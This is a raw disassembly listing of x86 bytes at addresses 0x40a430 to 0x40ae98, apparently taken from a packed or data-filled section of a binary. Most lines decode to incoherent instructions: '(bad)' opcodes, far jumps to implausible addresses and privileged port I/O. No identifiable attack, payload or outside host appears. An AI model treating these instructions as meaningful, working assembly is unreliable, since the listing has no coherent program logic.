  40a430:	mov    edi,0x60ffe565
  40a435:	(bad)  
  40a436:	add    WORD PTR [eax],ax
	...
  40a461:	add    bh,ah
  40a463:	je     0x40a423
  40a465:	push   0x3fcd16
  40a46a:	xchg   DWORD PTR [ebp+esi*2-0x1acdf0f8],esp
  40a471:	push   DWORD PTR [eax-0x39]
  40a474:	data16 add dl,BYTE PTR [edi+0x4068be74]
  40a47b:	int    0x3f
  40a47d:	add    bh,dl
  40a47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a480:	jne    0x40a48a
  40a482:	das    
  40a483:	push   cs
  40a484:	in     al,0xff
  40a486:	xor    BYTE PTR [edi+0x1a],dh
  40a489:	mov    esp,0xc2c9a430
  40a48e:	outs   dx,DWORD PTR ds:[esi]
  40a48f:	push   edi
  40a490:	push   ebp
  40a491:	mov    eax,DWORD PTR [ebx-0x28]
  40a494:	ret    
  40a495:	cld    
  40a496:	mov    ebp,0x50096a57
  40a49b:	and    al,BYTE PTR [edi]
  40a49d:	call   0x3f8ac5
  40a4a2:	into   
  40a4a3:	adc    bh,bl
  40a4a5:	push   0x4d
  40a4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4a8:	jne    0x40a4b2
  40a4aa:	jg     0x40a483
  40a4ac:	(bad)  
  40a4ad:	inc    DWORD PTR [eax]
  40a4af:	cmc    
  40a4b0:	and    edi,edi
  40a4b2:	push   0x4f
  40a4b4:	call   0xffe2952f
  40a4b9:	push   0xfffffff3
  40a4bb:	mov    eax,ds:0xf2af0875
  40a4c0:	std    
  40a4c1:	push   DWORD PTR [eax+0xfc75a1]
	...
  40a4ef:	add    BYTE PTR [esi],bh
  40a4f1:	jmp    0x4b56accd
  40a4f6:	popf   
  40a4f7:	(bad)  
  40a4f8:	stc    
  40a4f9:	retf   
  40a4fa:	inc    eax
  40a4fb:	add    al,0x3e
  40a4fd:	addr16 mov ebp,esp
  40a500:	push   esp
  40a501:	hlt    
  40a502:	jmp    0xd468:0x433890b
  40a509:	ret    0xffc3
  40a50c:	shl    BYTE PTR [edi-0x56],1
  40a50f:	dec    eax
  40a510:	jg     0x40a506
  40a512:	push   0xffffffd2
  40a514:	adc    BYTE PTR [ecx-0x3f81f4a2],0xf7
  40a51b:	dec    edi
  40a51c:	mov    cl,0xc7
  40a51e:	repnz (bad) 
  40a520:	xor    edi,eax
  40a522:	mov    dl,0xfe
  40a524:	sub    edi,esp
  40a526:	push   0xffffff98
  40a528:	mov    ds:0xdfe85e39,al
  40a52d:	jge    0x40a58d
  40a52f:	call   DWORD PTR [esp+esi*8]
  40a532:	jmp    0x7468:0x2b2e90b
  40a539:	loop   0x40a4fe
  40a53b:	(bad)  
  40a53c:	fprem1 
  40a53e:	add    al,BYTE PTR [eax]
  40a540:	mov    esi,0x61bea25c
  40a545:	icebp  
  40a546:	or     al,al
  40a548:	sar    dh,cl
  40a54a:	mov    dl,0xfe
  40a54c:	retf   
  40a54d:	add    ebx,DWORD PTR [ebp+esi*2+0x3a]
  40a551:	inc    esp
  40a552:	pop    ebp
  40a553:	jne    0x40a555
	...
  40a57d:	add    BYTE PTR [esi],dh
  40a57f:	sbb    al,0xeb
  40a581:	jecxz  0x40a5bc
  40a583:	sbb    DWORD PTR [edx+esi*2-0xb],ebp
  40a587:	rcr    BYTE PTR [edi+edi*8-0x4d],0x24
  40a58c:	pop    esp
  40a58d:	jne    0x40a5c1
  40a58f:	pushf  
  40a590:	push   esp
  40a591:	push   esi
  40a592:	jg     0x40a5ef
  40a594:	jmp    0x919430f5
  40a599:	and    BYTE PTR [edx],0x2
  40a59c:	xchg   esi,eax
  40a59d:	dec    ebx
  40a59e:	cld    
  40a59f:	dec    esi
  40a5a0:	jmp    0x6a2f6a5b
  40a5a5:	dec    eax
  40a5a6:	bnd je 0x40a592
  40a5a9:	jmp    0xc3ca7e5
  40a5ae:	(bad)  
  40a5af:	(bad)  [eax]
  40a5b1:	pop    ebp
  40a5b2:	(bad)  
  40a5b4:	stos   DWORD PTR es:[edi],eax
  40a5b5:	pop    edi
  40a5b6:	pop    bx
  40a5b8:	jmp    0x32b32e29
  40a5bd:	mov    dh,0x7e
  40a5bf:	pop    ebx
  40a5c0:	dec    esi
  40a5c1:	xlat   BYTE PTR ds:[ebx]
  40a5c2:	inc    ecx
  40a5c3:	repz enter 0xb15c,0x1
  40a5c8:	rol    DWORD PTR [edx],1
  40a5ca:	ds bnd jbe 0x40a5ba
  40a5ce:	fwait
  40a5cf:	test   al,0xa8
  40a5d1:	add    ebx,DWORD PTR [ecx+0x6bf187]
  40a5d7:	add    bl,BYTE PTR [esi]
  40a5d9:	pop    ebp
  40a5da:	mov    DWORD PTR [edi+0x530b5d15],eax
  40a5e0:	add    DWORD PTR [edi+0x0],esi
	...
  40a60b:	add    BYTE PTR [esi+0x7c4b0601],dh
  40a611:	push   esi
  40a612:	jmp    0x682f5acd
  40a617:	dec    eax
  40a618:	xchg   BYTE PTR [ecx],cl
  40a61a:	out    dx,al
  40a61b:	pop    esp
  40a61c:	retf   
  40a61d:	xchg   edi,eax
  40a61e:	in     eax,0xb3
  40a620:	push   eax
  40a621:	xchg   ebp,ebp
  40a623:	pop    esp
  40a624:	adc    esi,DWORD PTR [ebp-0x6be3ce0]
  40a62a:	add    ah,BYTE PTR [ebp+0x43f25b3e]
  40a630:	inc    ecx
  40a631:	(bad)  
  40a632:	mov    al,ds:0x5b3e02
  40a637:	scas   al,BYTE PTR es:[edi]
  40a638:	clc    
  40a639:	or     BYTE PTR [eax],al
  40a63b:	jmp    0x2d08017d
  40a640:	jbe    0x40a642
  40a642:	pop    es
  40a643:	jmp    0x3411b85
  40a648:	cmp    dh,BYTE PTR [ebp+0x0]
  40a64b:	add    eax,DWORD PTR [edx-0x32]
  40a64e:	inc    esp
  40a64f:	jge    0x40a5fe
  40a651:	iret   
  40a652:	test   BYTE PTR [ebp-0x6e],dh
  40a655:	add    bh,bh
  40a657:	sbb    DWORD PTR [ebx-0xf91077a],eax
  40a65d:	add    al,0xe8
  40a65f:	gs fwait
  40a661:	pop    ebx
  40a662:	add    dl,dh
  40a664:	jge    0x40a5ed
  40a666:	add    eax,0x5a4640
  40a66b:	jmp    0xa8887d15
	...
  40a698:	add    BYTE PTR [eax],al
  40a69a:	cmp    eax,0x15ed7500
  40a69f:	mov    ?,WORD PTR [esi-0x7454fdca]
  40a6a5:	sbb    eax,ecx
  40a6a7:	(bad)  
  40a6a8:	repz push ds
  40a6aa:	repnz dec DWORD PTR [edi-0x45]
  40a6ae:	adc    eax,0xe216be3e
  40a6b3:	rol    DWORD PTR [ecx+ebx*1+0x11ff0012],1
  40a6ba:	out    dx,al
  40a6bb:	(bad)  
  40a6bc:	(bad)  
  40a6bd:	(bad)  
  40a6be:	push   esi
  40a6bf:	add    BYTE PTR [edi-0x72],ah
  40a6c2:	stos   BYTE PTR es:[edi],al
  40a6c3:	fwait
  40a6c4:	add    dh,ch
  40a6c6:	mov    bl,0xb
  40a6c8:	mul    esi
  40a6ca:	cmc    
  40a6cb:	push   DWORD PTR [ebx+edx*4]
  40a6ce:	jp     0x40a66b
  40a6d0:	add    cl,al
  40a6d2:	leave  
  40a6d3:	mov    ebp,0xd5cbcefe
  40a6d8:	jecxz  0x40a6da
  40a6da:	lock mov ds:0xf4176aff,eax
  40a6e0:	ja     0x40a739
  40a6e2:	push   esi
  40a6e3:	push   edi
  40a6e4:	push   DWORD PTR [ebp-0x5429]
  40a6ea:	fsubr  DWORD PTR [ecx-0x56]
  40a6ed:	dec    eax
  40a6ee:	push   esi
  40a6ef:	push   edi
  40a6f0:	call   0xffe5116a
  40a6f5:	mov    DWORD PTR [edx+0x73],esp
  40a6f8:	idiv   edi
  40a6fa:	mov    eax,0x67fef0
	...
  40a727:	add    bh,ah
  40a729:	int3   
  40a72a:	aas    
  40a72b:	add    BYTE PTR [eax-0x16],ch
  40a72e:	out    dx,eax
  40a72f:	imul   DWORD PTR [eax-0x5c]
  40a732:	push   DWORD PTR ds:0x400ead
  40a738:	outs   dx,DWORD PTR ds:[esi]
  40a739:	int3   
  40a73a:	mov    ebx,0x84ce68ff
  40a73f:	call   0x6b404b54
  40a744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a745:	repz adc BYTE PTR [edi-0x2a],0x5b
  40a74a:	push   DWORD PTR [ebp-0x5399]
  40a750:	push   0xe648aa6a
  40a755:	pop    ebx
  40a756:	call   0xffe49194
  40a75b:	mov    DWORD PTR [edx],edx
  40a75d:	ja     0x40a756
  40a75f:	dec    DWORD PTR [eax-0x2e]
  40a762:	test   al,bl
  40a764:	jo     0x40a70a
  40a766:	call   DWORD PTR [eax-0x31]
  40a769:	xlat   BYTE PTR ds:[ebx]
  40a76a:	push   esi
  40a76b:	inc    ecx
  40a76c:	push   edi
  40a76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a76e:	mov    ch,0xf0
  40a770:	push   eax
  40a771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a772:	(bad)  
  40a773:	push   DWORD PTR [edx]
  40a775:	mov    cl,0x47
  40a777:	inc    ecx
  40a778:	push   edi
  40a779:	jae    0x40a791
  40a77b:	mov    ebp,0xb5a293e
  40a780:	(bad)  
  40a781:	test   al,0xfd
  40a783:	xor    bl,0xbc
  40a786:	push   ecx
  40a787:	jmp    FWORD PTR [ecx]
  40a789:	stc    
  40a78a:	iret   
  40a78b:	sldt   WORD PTR [eax]
	...
  40a7b6:	and    DWORD PTR ds:0xc5fa858a,eax
  40a7bc:	pop    ecx
  40a7bd:	jmp    FWORD PTR [esi-0x14]
  40a7c0:	gs mov ecx,0x146dde09
  40a7c6:	xor    eax,0x8e05ceb4
  40a7cb:	fdiv   QWORD PTR [ecx]
  40a7cd:	mov    ecx,0x8541d5f1
  40a7d2:	or     al,BYTE PTR [esi-0xbb400a6]
  40a7d8:	add    al,BYTE PTR [eax]
  40a7da:	mov    ebp,0xd1f75f2f
  40a7df:	jne    0x40a7e4
  40a7e1:	je     0x40a846
  40a7e3:	jno    0x40a77d
  40a7e5:	in     al,dx
  40a7e6:	leave  
  40a7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7e8:	pop    edx
  40a7e9:	add    BYTE PTR [edx],dh
  40a7eb:	mov    al,0x85
  40a7ed:	mov    ebp,0xff5a3da6
  40a7f2:	ds enter 0x67b5,0x3e
  40a7f7:	hlt    
  40a7f8:	imul   edi,DWORD PTR [esi-0x17f53867],0xff5a9de8
  40a802:	mov    DWORD PTR [edi+0x6581f767],esp
  40a808:	pop    edx
  40a809:	jne    0x40a851
  40a80b:	pop    esp
  40a80c:	lods   eax,DWORD PTR ds:[esi]
  40a80d:	mov    dh,0x71
  40a80f:	push   ebp
  40a810:	pop    edx
  40a811:	mov    ch,0x56
  40a813:	add    eax,0x7f61ff59
  40a818:	or     ebp,eax
	...
  40a842:	add    BYTE PTR [eax],al
  40a844:	mov    edx,0x51ff5a46
  40a849:	pop    ebx
  40a84a:	pushf  
  40a84b:	pusha  
  40a84c:	push   ecx
  40a84d:	(bad)  
  40a84e:	fstp   QWORD PTR [ecx-0x35]
  40a851:	push   edx
  40a852:	ror    DWORD PTR [edx+0x59cdfdf0],0xeb
  40a859:	cli    
  40a85a:	mov    ebp,0x33fe2959
  40a85f:	or     al,0x16
  40a861:	fstp   TBYTE PTR [esi+0x59]
  40a864:	sbb    esi,edi
  40a866:	jae    0x40a8a0
  40a868:	or     esi,edi
  40a86a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a86b:	pop    ecx
  40a86c:	xchg   ebx,eax
  40a86d:	push   ebx
  40a86e:	xchg   ecx,eax
  40a86f:	hlt    
  40a870:	retf   
  40a871:	std    
  40a872:	xchg   ebp,eax
  40a873:	pop    ecx
  40a874:	mov    bl,0xf6
  40a876:	xchg   ebp,eax
  40a877:	pop    ecx
  40a878:	icebp  
  40a879:	repnz sbb al,0x9b
  40a87c:	jmp    0xd2d0267e
  40a881:	add    eax,0x93e65976
  40a886:	xor    BYTE PTR [ecx-0x2f],bl
  40a889:	std    
  40a88a:	fwait
  40a88b:	ins    BYTE PTR es:[edi],dx
  40a88c:	sar    ebp,1
  40a88e:	pop    ebp
  40a88f:	ins    BYTE PTR es:[edi],dx
  40a890:	add    ah,al
  40a892:	push   ebp
  40a893:	pop    ecx
  40a894:	mov    ecx,0xb15148c7
  40a899:	std    
  40a89a:	push   eax
  40a89b:	adc    eax,0x593dfde7
  40a8a0:	jmp    0x40a8ac
  40a8a2:	ds pop ecx
  40a8a4:	cdq    
  40a8a5:	repnz add BYTE PTR [ebx+0x0],bl
	...
  40a8d0:	add    BYTE PTR [eax],al
  40a8d2:	xchg   ecx,eax
  40a8d3:	std    
  40a8d4:	and    eax,0xd5f391bf
  40a8d9:	pop    ecx
  40a8da:	cmp    ebp,0xf275cf15
  40a8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8e1:	sahf   
  40a8e2:	ds pop ebx
  40a8e4:	xor    BYTE PTR [esi+0x36],al
  40a8e7:	pop    ebx
  40a8e8:	xchg   esp,eax
  40a8e9:	mov    WORD PTR [edx-0x27],ss
  40a8ec:	jmp    FWORD PTR [edx+edi*8]
  40a8ef:	jo     0x40a8f1
  40a8f1:	add    DWORD PTR [edx-0x2],0x74
  40a8f5:	icebp  
  40a8f6:	aad    0x40
  40a8f8:	mov    dh,0xde
  40a8fa:	out    0xd3,al
  40a8fc:	inc    esp
  40a8fd:	aad    0xc0
  40a8ff:	xchg   esi,eax
  40a900:	clc    
  40a901:	cmp    DWORD PTR [edx],esp
  40a903:	xor    DWORD PTR [edi+0x28],edx
  40a906:	inc    edx
  40a907:	jae    0x40a921
  40a909:	push   ss
  40a90a:	std    
  40a90b:	cld    
  40a90c:	std    
  40a90d:	cld    
  40a90e:	jmp    0x40a8a3
  40a910:	inc    ecx
  40a911:	jmp    0xa6fba6bb
  40a916:	push   ax
  40a918:	rcl    BYTE PTR ds:0xe8688d0f,0x3d
  40a91f:	in     al,dx
  40a920:	mov    ebp,0x5005008e
  40a925:	xchg   al,bh
  40a927:	push   esp
  40a928:	call   0xff3cd09e
  40a92d:	or     DWORD PTR [edx-0x4791013d],0xb9f896
	...
  40a95f:	add    ch,dl
  40a961:	inc    ecx
  40a962:	push   edi
  40a963:	test   al,0x3d
  40a965:	jae    0x40a97f
  40a967:	mov    esi,0x14fdfc7c
  40a96c:	loopne 0x40a901
  40a96e:	inc    ecx
  40a96f:	jmp    0x3efbba89
  40a974:	push   es
  40a975:	push   eax
  40a976:	sar    BYTE PTR [ebp-0x14977372],0x3d
  40a97d:	in     al,dx
  40a97e:	mov    ebp,0x50047826
  40a983:	push   ds
  40a984:	jo     0x40a9da
  40a986:	call   0xff3ce148
  40a98b:	add    esi,ebp
  40a98d:	ret    0xfe
  40a990:	inc    eax
  40a991:	lock dec ecx
  40a993:	push   edi
  40a994:	xchg   esi,eax
  40a995:	pop    eax
  40a996:	push   DWORD PTR [ebp+0x5f]
  40a999:	jo     0x40aa12
  40a99b:	std    
  40a99c:	pusha  
  40a99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a99e:	push   DWORD PTR [ebp+0x63]
  40a9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9a2:	jne    0x40a9ac
  40a9a4:	outs   dx,DWORD PTR ds:[esi]
  40a9a5:	mov    ds:0x8e10ffb5,al
  40a9aa:	ret    0x2704
  40a9ad:	retf   
  40a9ae:	mov    esp,ebp
  40a9b0:	xchg   esi,eax
  40a9b1:	fdivr  st(7),st
  40a9b4:	loopne 0x40a959
  40a9b6:	lea    eax,[ebp-0x2d]
  40a9b9:	(bad)  
  40a9ba:	std    
  40a9bb:	jne    0x40a9b0
  40a9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9be:	xor    eax,0xff164faa
  40a9c3:	out    0x0,eax
	...
  40a9ed:	add    BYTE PTR [ebp-0x23000045],al
  40a9f3:	xchg   edi,eax
  40a9f4:	jne    0x40ffa0
  40a9fa:	cwde   
  40a9fb:	sbb    edi,esi
  40a9fd:	add    bh,dl
  40a9ff:	push   edi
  40aa00:	add    bh,al
  40aa02:	sub    ch,BYTE PTR [ebx+0x57e707ff]
  40aa08:	push   0x0
  40aa0a:	in     eax,dx
  40aa0b:	push   edi
  40aa0c:	push   0x0
  40aa0e:	in     eax,dx
  40aa0f:	push   edi
  40aa10:	lea    eax,[ebp+0x1b]
  40aa13:	(bad)  
  40aa14:	mov    eax,DWORD PTR [ebp-0x73f5]
  40aa1a:	(bad)  
  40aa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1c:	jne    0x40aa16
  40aa1e:	pusha  
  40aa1f:	sub    bh,bl
  40aa21:	call   0x4085b1
  40aa26:	pushf  
  40aa27:	xchg   edi,eax
  40aa28:	je     0x40aa2f
  40aa2a:	fild   DWORD PTR cs:[eax]
  40aa2d:	add    BYTE PTR [edi+0x3e4884ef],dl
  40aa33:	mov    bl,0x2
  40aa35:	(bad)  
  40aa36:	jmp    0x40aa55
  40aa38:	imul   esi,DWORD PTR [ebp+0x505754a5],0xffffffb5
  40aa3f:	popa   
  40aa40:	mov    DWORD PTR [ebp-0xaa03ae],eax
  40aa46:	out    dx,al
  40aa47:	fild   QWORD PTR [edx-0x5b]
  40aa4a:	test   esp,esi
  40aa4c:	push   ebp
  40aa4d:	mov    DWORD PTR [ebx+0xff4e21],edi
	...
  40aa7b:	add    BYTE PTR [ecx],bh
  40aa7d:	sbb    eax,0x2a31b75a
  40aa82:	jmp    0xae0d4c86
  40aa87:	inc    eax
  40aa88:	ds mov ecx,0xb211f08f
  40aa8e:	push   ebp
  40aa8f:	dec    DWORD PTR [ebx-0x22]
  40aa92:	retf   0x3e40
  40aa95:	int3   
  40aa96:	pop    ecx
  40aa97:	mov    edx,0x858bda01
  40aa9c:	loop   0x40aa77
  40aa9e:	push   ebp
  40aa9f:	jmp    DWORD PTR [esp+eax*1-0x15]
  40aaa3:	nop
  40aaa4:	xchg   ecx,eax
  40aaa5:	inc    ebx
  40aaa6:	add    al,0xff
  40aaa8:	stos   DWORD PTR es:[edi],eax
  40aaa9:	je     0x40aaf9
  40aaab:	(bad)  
  40aaac:	fnstenv [ecx+0x10]
  40aaaf:	stos   BYTE PTR es:[edi],al
  40aab0:	xchg   BYTE PTR [ebx+0x4],al
  40aab3:	call   0xff9669a3
  40aab8:	mov    bh,0x7f
  40aaba:	idiv   DWORD PTR [bx+di-0x166f]
  40aabf:	call   FWORD PTR [ecx]
  40aac1:	outs   dx,BYTE PTR ds:[esi]
  40aac2:	scas   al,BYTE PTR es:[edi]
  40aac3:	inc    eax
  40aac4:	mov    eax,ds:0x39a9f090
  40aaca:	push   esi
  40aacb:	call   DWORD PTR [ebx-0x22]
  40aace:	retf   0x3e40
  40aad1:	pushf  
  40aad2:	xchg   esi,eax
  40aad3:	mov    edx,0x8c265b89
  40aad8:	mov    ebx,0x795615fb
  40aadd:	test   ecx,ebp
  40aadf:	jmp    0x40aae1
	...
  40ab09:	add    al,dl
  40ab0b:	xchg   edx,eax
  40ab0c:	test   al,0x3
  40ab0e:	imul   esi,DWORD PTR [eax-0x59eb208],0xa3a40ffd
  40ab18:	test   al,0x3
  40ab1a:	mov    sp,0x5632
  40ab1e:	dec    ecx
  40ab1f:	in     al,0x6b
  40ab21:	ins    BYTE PTR es:[edi],dx
  40ab22:	dec    ecx
  40ab23:	cli    
  40ab24:	fucomp st(2)
  40ab26:	cmp    DWORD PTR [edx+0x5b7ead98],eax
  40ab2c:	into   
  40ab2d:	(bad)  
  40ab2e:	repnz lds edx,FWORD PTR cs:[ebp+0x21]
  40ab33:	xor    BYTE PTR [ebx-0x3ea48134],dl
  40ab39:	adc    esp,0xc38badf9
  40ab3f:	push   ss
  40ab40:	sahf   
  40ab41:	push   ebp
  40ab42:	add    esi,ebx
  40ab44:	pop    ebx
  40ab45:	pusha  
  40ab46:	icebp  
  40ab47:	stc    
  40ab48:	xchg   ebp,eax
  40ab49:	add    al,0x6a
  40ab4b:	sub    BYTE PTR [edx-0x69],0xda
  40ab4f:	icebp  
  40ab50:	test   DWORD PTR [ebp+0x3e],edx
  40ab53:	outs   dx,DWORD PTR ds:[esi]
  40ab54:	sbb    eax,0x7e029b81
  40ab59:	push   ebp
  40ab5a:	rcr    DWORD PTR [edx-0xb],1
  40ab5d:	mov    al,0x61
  40ab5f:	pop    ebx
  40ab60:	jmp    0xd43a2bc9
  40ab65:	or     esp,DWORD PTR [esi-0x4eaa65f8]
  40ab6b:	stc    
  40ab6c:	xchg   ebx,eax
  40ab6d:	push   0x0
	...
  40ab96:	add    BYTE PTR [eax],al
  40ab98:	mov    cl,0xf9
  40ab9a:	inc    ebp
  40ab9b:	push   ebp
  40ab9c:	sub    esp,DWORD PTR [ebx+0x51]
  40ab9f:	ret    0xf9cd
  40aba2:	push   DWORD PTR ds:0x36e7afeb
  40aba8:	repz stc 
  40abaa:	(bad)  
  40abab:	pushf  
  40abac:	xor    eax,0x13553403
  40abb1:	cli    
  40abb2:	(bad)  
  40abb3:	pop    esp
  40abb4:	fdivrp st(1),st
  40abb6:	dec    BYTE PTR [esi]
  40abb8:	adc    esi,DWORD PTR [eax+0x8]
  40abbb:	adc    DWORD PTR [eax-0x51],eax
  40abbe:	(bad)  
  40abbf:	(bad)  
  40abc0:	repnz scas eax,DWORD PTR es:[edi]
  40abc2:	(bad)  
  40abc4:	jmp    0x1803:0x3574fef9
  40abcb:	popf   
  40abcc:	jmp    0xfef0:0x7194fef9
  40abd3:	(bad)  
  40abd4:	mov    ch,BYTE PTR [esi+0x8]
  40abd7:	shl    DWORD PTR [edi],0xaf
  40abda:	inc    dh
  40abdc:	mov    ch,BYTE PTR [esi-0x78d491d]
  40abe2:	out    0xc5,eax
  40abe4:	ret    
  40abe5:	clc    
  40abe6:	(bad)  
  40abe7:	scas   al,BYTE PTR es:[edi]
  40abe8:	mov    eax,0x6aa6f707
  40abed:	add    esp,ecx
  40abef:	push   edi
  40abf0:	xchg   edx,eax
  40abf1:	clc    
  40abf2:	(bad)  
  40abf3:	pop    esp
  40abf4:	lock dec BYTE PTR gs:[esi-0x7949eeab]
	...
  40ac24:	add    BYTE PTR [eax],al
  40ac26:	mov    bh,al
  40ac28:	mov    ah,0x89
  40ac2a:	mov    bh,al
  40ac2c:	inc    BYTE PTR [ecx+0x6efeb186]
  40ac32:	jb     0x40abe2
  40ac34:	fistp  DWORD PTR [esi+0x6a]
  40ac37:	clc    
  40ac38:	out    0x29,eax
  40ac3a:	retf   
  40ac3b:	clc    
  40ac3c:	(bad)  
  40ac3d:	push   esi
  40ac3e:	shr    bl,0xf6
  40ac41:	dec    esi
  40ac42:	adc    bh,al
  40ac44:	je     0x40ac46
  40ac46:	scas   eax,DWORD PTR es:[edi]
  40ac47:	test   BYTE PTR [edi],dh
  40ac49:	(bad)  
  40ac4a:	pop    eax
  40ac4b:	(bad)  
  40ac4c:	push   DWORD PTR [ebp-0x58a9]
  40ac52:	call   esi
  40ac54:	mov    ch,0xff
  40ac56:	pop    eax
  40ac57:	pop    DWORD PTR [ebp-0x8]
  40ac5a:	dec    esi
  40ac5b:	push   ds
  40ac5c:	std    
  40ac5d:	dec    DWORD PTR [eax-0x71]
  40ac60:	jne    0x40ac5e
  40ac62:	aas    
  40ac63:	fwait
  40ac64:	mov    ds:0xc2a55700,al
  40ac69:	or     BYTE PTR [edi-0x37],ah
  40ac6c:	mov    esp,ebp
  40ac6e:	in     al,0x37
  40ac70:	cld    
  40ac71:	push   0x57
  40ac73:	add    cl,BYTE PTR [ebx]
  40ac75:	jmp    edx
  40ac77:	mul    dh
  40ac79:	mov    ecx,0x89ff8bd4
  40ac7e:	bound  ecx,QWORD PTR [ebx+0x1e70bd68]
  40ac84:	(bad)  
  40ac85:	(bad)  
  40ac86:	(bad)  
  40ac87:	mul    esi
  40ac89:	test   BYTE PTR [eax],0x0
	...
  40acb4:	fimul  DWORD PTR [ebx-0x74ad0001]
  40acba:	push   DWORD PTR [ebp+0x1f]
  40acbd:	xchg   esp,eax
  40acbe:	in     al,0xb3
  40acc0:	fmul   DWORD PTR [ebx+0x5be3c2c9]
  40acc6:	push   ebp
  40acc7:	mov    edi,DWORD PTR [ebx-0x2f2f3c23]
  40accd:	mov    edi,edi
  40accf:	lea    edx,[edx]
  40acd1:	mov    edx,DWORD PTR [eax-0x1]
  40acd4:	shl    bh,cl
  40acd6:	std    
  40acd7:	xor    eax,0x3fb77d
  40acdc:	mov    edi,0xd700a125
  40ace1:	clc    
  40ace2:	mov    esi,0x269220f
  40ace7:	add    BYTE PTR [esi],bh
  40ace9:	add    cl,BYTE PTR [edx+0x45]
  40acec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aced:	add    DWORD PTR [ebx],eax
  40acef:	add    BYTE PTR [esi],bh
  40acf1:	dec    ecx
  40acf2:	leave  
  40acf3:	repz cdq 
  40acf5:	add    BYTE PTR [ebx],al
  40acf7:	add    BYTE PTR [edx+eax*1],ah
  40acfa:	(bad)  
  40acfc:	pop    ss
  40acfd:	add    bl,ch
  40acff:	push   DWORD PTR [edx-0x34afa93a]
  40ad05:	jle    0x40ad5f
  40ad07:	div    DWORD PTR [ecx+0x50]
  40ad0a:	mov    ah,0xfe
  40ad0c:	repz dec ecx
  40ad0e:	push   ebx
  40ad0f:	jne    0x40ad73
  40ad11:	dec    ecx
  40ad12:	mov    edi,0xfe023ea1
  40ad17:	mov    edi,0x0
	...
  40ad40:	add    BYTE PTR [eax],al
  40ad42:	retf   0x5c06
  40ad45:	std    
  40ad46:	aas    
  40ad47:	add    al,BYTE PTR [ebx]
  40ad49:	push   0xffc529b8
  40ad4e:	cmp    BYTE PTR [eax-0x342d1800],dl
  40ad54:	push   ecx
  40ad55:	push   DWORD PTR [ebp+0x2a857fb4]
  40ad5b:	mov    dh,0x51
  40ad5d:	jmp    FWORD PTR [esi+0x52]
  40ad60:	pop    esp
  40ad61:	loope  0x40ad3a
  40ad63:	lods   eax,DWORD PTR ds:[esi]
  40ad64:	push   ecx
  40ad65:	mov    ebx,eax
  40ad67:	mov    ah,0x59
  40ad69:	inc    DWORD PTR [ecx]
  40ad6b:	dec    ebx
  40ad6c:	add    al,0x68
  40ad6e:	push   edi
  40ad6f:	pushf  
  40ad70:	vlddqu ymm2,[edi-0x1a1608ad]
  40ad78:	push   ecx
  40ad79:	xor    eax,0xffc52c94
  40ad7e:	loope  0x40ad4c
  40ad80:	mov    bh,bh
  40ad82:	sar    DWORD PTR [ebx-0x78],1
  40ad85:	in     al,0xd1
  40ad87:	test   DWORD PTR [edx+0x6a],edx
  40ad8a:	ds pop ebx
  40ad8c:	sar    ebp,1
  40ad8e:	adc    DWORD PTR [ecx+ebp*8+0x5debeb52],ebx
  40ad95:	push   edx
  40ad96:	test   eax,0xf69e13f6
  40ad9b:	fwait
  40ad9c:	jmp    0x3df431fc
  40ada1:	push   edx
  40ada2:	(bad)  
  40ada3:	loopne 0x40ade9
  40ada5:	pop    edx
	...
  40adce:	add    BYTE PTR [eax],al
  40add0:	mov    esi,esi
  40add2:	ret    0x1603
  40add5:	rol    sp,0x79
  40add9:	cmc    
  40adda:	push   ebx
  40addb:	push   ebx
  40addc:	imul   esi,esi,0xc1335215
  40ade2:	mov    al,ds:0x54fe61c4
  40ade7:	mov    ebx,DWORD PTR [ecx-0xa]
  40adea:	outs   dx,DWORD PTR ds:[esi]
  40adeb:	mov    BYTE PTR [esi-0x12],ah
  40adee:	cmc    
  40adef:	push   ecx
  40adf0:	aam    0x5a
  40adf2:	sub    edi,0x50e99be9
  40adf8:	repz jmp 0x9e1b:0xf63151d5
  40ae00:	jbe    0x40ad9e
  40ae02:	jmp    0xc5f35e62
  40ae07:	push   ecx
  40ae08:	(bad)  
  40ae09:	(bad)  
  40ae0b:	pop    ecx
  40ae0c:	adc    esi,esi
  40ae0e:	arpl   WORD PTR [edi+0x51adedf2],ax
  40ae14:	outs   dx,BYTE PTR ds:[esi]
  40ae15:	cmp    ebp,0xffffffab
  40ae18:	jle    0x40ae75
  40ae1a:	sahf   
  40ae1b:	xchg   edi,eax
  40ae1c:	out    dx,al
  40ae1d:	in     eax,dx
  40ae1e:	xchg   ebp,eax
  40ae1f:	push   ecx
  40ae20:	jmp    0x7efcf154
  40ae25:	pop    ebx
  40ae26:	xchg   ecx,eax
  40ae27:	fst    QWORD PTR [ecx-0x6e02820b]
  40ae2d:	outs   dx,BYTE PTR ds:[esi]
  40ae2e:	add    al,dl
  40ae30:	ret    0xd3b7
  40ae33:	jbe    0x40ae35
	...
  40ae5d:	add    BYTE PTR [edi-0xa],ch
  40ae60:	add    ebx,esp
  40ae62:	lods   eax,DWORD PTR ds:[esi]
  40ae63:	hlt    
  40ae64:	das    
  40ae65:	outs   dx,BYTE PTR ds:[esi]
  40ae66:	mov    ecx,0xf56f716
  40ae6b:	mov    ebp,eax
  40ae6d:	adc    ecx,ecx
  40ae6f:	cmc    
  40ae70:	(bad)  
  40ae71:	push   edx
  40ae72:	xchg   esi,eax
  40ae73:	pusha  
  40ae74:	shl    BYTE PTR [ebp+0x5e88b47],0xb1
  40ae7b:	cmc    
  40ae7c:	(bad)  
  40ae7d:	es mov ecx,0xf26f716
  40ae83:	push   eax
  40ae84:	add    cl,ch
  40ae86:	cmp    eax,0x73984e8
  40ae8b:	idiv   dh
  40ae8d:	mov    ecx,0xa8583a85
  40ae92:	cmp    eax,0xf6f9b4f6
  40ae97:	cmc    
  40ae98:	(bad)  
